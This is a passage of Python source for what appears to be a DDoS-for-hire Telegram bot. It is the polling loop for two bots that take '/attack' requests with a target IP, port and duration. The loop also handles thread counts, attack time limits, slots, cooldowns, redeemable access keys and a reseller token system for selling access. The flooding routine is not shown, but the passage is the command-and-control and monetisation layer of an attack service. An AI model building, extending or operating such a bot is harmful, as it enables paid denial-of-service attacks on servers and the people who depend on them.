                        waiting1[chat_id] = "setthreads"
                        send_msg(TOKEN1, chat_id, "Send threads count (100-5000)")
                    elif cmd == "/settime":
                        waiting1[chat_id] = "settime"
                        send_msg(TOKEN1, chat_id, "Send max time (60-600 seconds)")
                    elif cmd == "/setslots":
                        waiting1[chat_id] = "setslots"
                        send_msg(TOKEN1, chat_id, "Send slots count (1-200)")
                    elif cmd == "/setcooldown":
                        waiting1[chat_id] = "setcooldown"
                        send_msg(TOKEN1, chat_id, "Send cooldown seconds (0-600)")
                    elif cmd == "/setdaily":
                        waiting1[chat_id] = "setdaily"
                        send_msg(TOKEN1, chat_id, "Send daily limit (1-1000)")
                    elif cmd == "/gen":
                        waiting1[chat_id] = "gen"
                        send_msg(TOKEN1, chat_id, "Send: PREFIX DURATION\nExample: ROLEX 7d")
                    elif cmd == "/keys":
                        handle_keys1(chat_id)
                    elif cmd == "/deletekeys":
                        handle_deletekeys1(chat_id)
                    elif cmd == "/blockkey":
                        waiting1[chat_id] = "blockkey"
                        send_msg(TOKEN1, chat_id, "Send key to block")
                    elif cmd == "/unblockkey":
                        waiting1[chat_id] = "unblockkey"
                        send_msg(TOKEN1, chat_id, "Send key to unblock")
                    elif cmd == "/broadcast":
                        waiting1[chat_id] = "broadcast"
                        send_msg(TOKEN1, chat_id, "Send message to broadcast")
                    elif cmd == "/lock":
                        handle_lock1(chat_id)
                    elif cmd == "/unlock":
                        handle_unlock1(chat_id)
                    elif cmd == "/unlimited":
                        waiting1[chat_id] = "unlimited"
                        send_msg(TOKEN1, chat_id, "Send reseller ID to make unlimited")
                    elif cmd == "/limited":
                        waiting1[chat_id] = "limited"
                        send_msg(TOKEN1, chat_id, "Send: ID TOKENS\nExample: 123456789 50")
                    elif cmd == "/genkey":
                        if is_reseller1(uid):
                            handle_genkey_reseller1(chat_id, uid)
                        else:
                            send_msg(TOKEN1, chat_id, "❌ Reseller only!")
                    elif cmd == "/mykeys":
                        if is_reseller1(uid):
                            handle_mykeys1(chat_id, uid)
                        else:
                            send_msg(TOKEN1, chat_id, "❌ Reseller only!")
                    elif cmd == "/deletekey":
                        if is_reseller1(uid):
                            waiting1[chat_id] = "deletekey"
                            send_msg(TOKEN1, chat_id, "Send key to delete")
                        else:
                            send_msg(TOKEN1, chat_id, "❌ Reseller only!")
                    elif cmd == "/blockkey_reseller":
                        if is_reseller1(uid):
                            waiting1[chat_id] = "blockkey_reseller"
                            send_msg(TOKEN1, chat_id, "Send key to block")
                        else:
                            send_msg(TOKEN1, chat_id, "❌ Reseller only!")
                    elif cmd == "/unblockkey_reseller":
                        if is_reseller1(uid):
                            waiting1[chat_id] = "unblockkey_reseller"
                            send_msg(TOKEN1, chat_id, "Send key to unblock")
                        else:
                            send_msg(TOKEN1, chat_id, "❌ Reseller only!")
                    elif cmd == "/myblockedkeys":
                        if is_reseller1(uid):
                            handle_myblockedkeys1(chat_id, uid)
                        else:
                            send_msg(TOKEN1, chat_id, "❌ Reseller only!")
                    elif cmd == "/resellers":
                        handle_resellers1(chat_id)
                    elif cmd == "/help":
                        handle_help1(chat_id)
                    elif cmd == "/rules":
                        handle_rules1(chat_id)
            
            # Bot 2 updates (same structure)
            url2 = f"https://api.telegram.org/bot{TOKEN2}/getUpdates?offset={last_id2+1}&timeout=1"
            r2 = requests.get(url2, timeout=2)
            data2 = r2.json()
            
            for update in data2.get("result", []):
                last_id2 = update["update_id"]
                msg = update.get("message")
                if not msg:
                    continue
                chat_id = msg["chat"]["id"]
                uid = msg["from"]["id"]
                text = msg.get("text", "")
                
                if not text:
                    continue
                
                cmd = text.lower()
                
                if waiting2.get(chat_id) == "attack":
                    handle_attack_input2(chat_id, uid, text)
                    waiting2[chat_id] = False
                elif waiting2.get(chat_id) == "redeem":
                    handle_redeem2(chat_id, text)
                    waiting2[chat_id] = False
                elif waiting2.get(chat_id) == "adduser":
                    handle_adduser2(chat_id, text)
                    waiting2[chat_id] = False
                elif waiting2.get(chat_id) == "removeuser":
                    handle_removeuser2(chat_id, text)
                    waiting2[chat_id] = False
                elif waiting2.get(chat_id) == "addgroup":
                    handle_addgroup2(chat_id, text)
                    waiting2[chat_id] = False
                elif waiting2.get(chat_id) == "removegroup":
                    handle_removegroup2(chat_id, text)
                    waiting2[chat_id] = False
                elif waiting2.get(chat_id) == "addreseller":
                    handle_addreseller2(chat_id, text)
                    waiting2[chat_id] = False
                elif waiting2.get(chat_id) == "removereseller":
                    handle_removereseller2(chat_id, text)
                    waiting2[chat_id] = False
                elif waiting2.get(chat_id) == "setthreads":
                    handle_setthreads2(chat_id, text)
                    waiting2[chat_id] = False
                elif waiting2.get(chat_id) == "settime":
                    handle_settime2(chat_id, text)
                    waiting2[chat_id] = False
                elif waiting2.get(chat_id) == "setslots":
                    handle_setslots2(chat_id, text)
                    waiting2[chat_id] = False
                elif waiting2.get(chat_id) == "setcooldown":
                    handle_setcooldown2(chat_id, text)
                    waiting2[chat_id] = False
                elif waiting2.get(chat_id) == "setdaily":
                    handle_setdaily2(chat_id, text)
                    waiting2[chat_id] = False
                elif waiting2.get(chat_id) == "gen":
                    handle_gen2(chat_id, text)
                    waiting2[chat_id] = False
                elif waiting2.get(chat_id) == "blockkey":
                    handle_blockkey2(chat_id, text)
                    waiting2[chat_id] = False
                elif waiting2.get(chat_id) == "unblockkey":
                    handle_unblockkey2(chat_id, text)
                    waiting2[chat_id] = False
                elif waiting2.get(chat_id) == "broadcast":
                    handle_broadcast2(chat_id, text)
                    waiting2[chat_id] = False
                elif waiting2.get(chat_id) == "unlimited":
                    handle_unlimited2(chat_id, text)
                    waiting2[chat_id] = False
                elif waiting2.get(chat_id) == "limited":
                    handle_limited2(chat_id, text)
                    waiting2[chat_id] = False
                else:
                    if cmd == "/start":
                        handle_start2(chat_id, uid)
                    elif cmd == "/attack":
                        waiting2[chat_id] = "attack"
                        send_msg(TOKEN2, chat_id, "Send: IP PORT TIME\nExample: 1.2.3.4 80 30")
                    elif cmd == "/stop":
                        handle_stop2(chat_id)
                    elif cmd == "/id":
                        handle_id2(chat_id, uid)
                    elif cmd == "/redeem":
                        waiting2[chat_id] = "redeem"
                        send_msg(TOKEN2, chat_id, "Enter your redemption key")
                    elif cmd == "/adduser":
                        waiting2[chat_id] = "adduser"
                        send_msg(TOKEN2, chat_id, "Send: USER_ID DAYS\nExample: 123456789 7")
                    elif cmd == "/removeuser":
                        waiting2[chat_id] = "removeuser"
                        send_msg(TOKEN2, chat_id, "Send USER_ID to remove")
                    elif cmd == "/addgroup":
                        waiting2[chat_id] = "addgroup"
                        send_msg(TOKEN2, chat_id, "Send: GROUP_ID DAYS\nExample: -100123456789 7")
                    elif cmd == "/removegroup":
                        waiting2[chat_id] = "removegroup"
                        send_msg(TOKEN2, chat_id, "Send GROUP ID to remove")
                    elif cmd == "/addreseller":
                        waiting2[chat_id] = "addreseller"
                        send_msg(TOKEN2, chat_id, "Send: USER_ID TOKENS\nExample: 123456789 100")
                    elif cmd == "/removereseller":
                        waiting2[chat_id] = "removereseller"
                        send_msg(TOKEN2, chat_id, "Send USER ID to remove")
                    elif cmd == "/setthreads":
                        waiting2[chat_id] = "setthreads"
                        send_msg(TOKEN2, chat_id, "Send threads count (100-5000)")
                    elif cmd == "/settime":
                        waiting2[chat_id] = "settime"
                        send_msg(TOKEN2, chat_id, "Send max time (60-600 seconds)")
                    elif cmd == "/setslots":
                        waiting2[chat_id] = "setslots"
                        send_msg(TOKEN2, chat_id, "Send slots count (1-200)")
                    elif cmd == "/setcooldown":
                        waiting2[chat_id] = "setcooldown"
                        send_msg(TOKEN2, chat_id, "Send cooldown seconds (0-600)")
                    elif cmd == "/setdaily":
                        waiting2[chat_id] = "setdaily"
                        send_msg(TOKEN2, chat_id, "Send daily limit (1-1000)")
                    elif cmd == "/gen":
                        waiting2[chat_id] = "gen"
                        send_msg(TOKEN2, chat_id, "Send: PREFIX DURATION\nExample: DEVIL 7d")
                    elif cmd == "/keys":
                        handle_keys2(chat_id)
                    elif cmd == "/deletekeys":
                        handle_deletekeys2(chat_id)
                    elif cmd == "/blockkey":
                        waiting2[chat_id] = "blockkey"
                        send_msg(TOKEN2, chat_id, "Send key to block")
                    elif cmd == "/unblockkey":
                        waiting2[chat_id] = "unblockkey"
                        send_msg(TOKEN2, chat_id, "Send key to unblock")
                    elif cmd == "/broadcast":
                        waiting2[chat_id] = "broadcast"
                        send_msg(TOKEN2, chat_id, "Send message to broadcast")
                    elif cmd == "/lock":
                        handle_lock2(chat_id)
                    elif cmd == "/unlock":
                        handle_unlock2(chat_id)
                    elif cmd == "/unlimited":
                        waiting2[chat_id] = "unlimited"
                        send_msg(TOKEN2, chat_id, "Send reseller ID to make unlimited")
                    elif cmd == "/limited":
                        waiting2[chat_id] = "limited"
                        send_msg(TOKEN2, chat_id, "Send: ID TOKENS\nExample: 123456789 50")
                    elif cmd == "/genkey":
                        if is_reseller2(uid):
                            handle_genkey_reseller2(chat_id, uid)
                        else:
                            send_msg(TOKEN2, chat_id, "❌ Reseller only!")
                    elif cmd == "/mykeys":
                        if is_reseller2(uid):
                            handle_mykeys2(chat_id, uid)
                        else:
                            send_msg(TOKEN2, chat_id, "❌ Reseller only!")
                    elif cmd == "/deletekey":
                        if is_reseller2(uid):
                            waiting2[chat_id] = "deletekey"
                            send_msg(TOKEN2, chat_id, "Send key to delete")
                        else:
                            send_msg(TOKEN2, chat_id, "❌ Reseller only!")
                    elif cmd == "/blockkey_reseller":
                        if is_reseller2(uid):
                            waiting2[chat_id] = "blockkey_reseller"
                            send_msg(TOKEN2, chat_id, "Send key to block")
                        else:
                            send_msg(TOKEN2, chat_id, "❌ Reseller only!")
                    elif cmd == "/unblockkey_reseller":
                        if is_reseller2(uid):
                            waiting2[chat_id] = "unblockkey_reseller"
                            send_msg(TOKEN2, chat_id, "Send key to unblock")
                        else:
                            send_msg(TOKEN2, chat_id, "❌ Reseller only!")
                    elif cmd == "/myblockedkeys":
                        if is_reseller2(uid):
                            handle_myblockedkeys2(chat_id, uid)
                        else:
                            send_msg(TOKEN2, chat_id, "❌ Reseller only!")
                    elif cmd == "/resellers":
                        handle_resellers2(chat_id)
                    elif cmd == "/help":
                        handle_help2(chat_id)
                    elif cmd == "/rules":
                        handle_rules2(chat_id)
            
            # No sleep - instant response
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(0.5)

if __name__ == "__main__":
    main()